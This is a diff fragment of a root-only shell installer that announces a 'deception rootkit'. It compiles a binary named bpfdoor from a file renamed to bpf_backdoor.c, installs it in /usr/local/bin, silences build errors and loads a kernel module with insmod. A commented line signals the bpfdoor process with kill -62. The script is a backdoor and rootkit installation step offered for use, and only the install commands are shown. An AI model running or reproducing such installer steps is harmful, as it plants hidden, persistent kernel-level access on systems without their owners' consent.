@@ -3,7 +3,7 @@
 [ "$(id -u)" -ne 0 ] && printf "Must be root to install\n" && exit 1
 
 printf "Installing deception rootkit...\n"
-gcc -o /usr/local/bin/bpfdoor bpf.c
+gcc -o /usr/local/bin/bpfdoor bpf_backdoor.c
 make -s 2>/dev/null
 insmod deception.ko 
 #pgrep bpfdoor | xargs kill -62
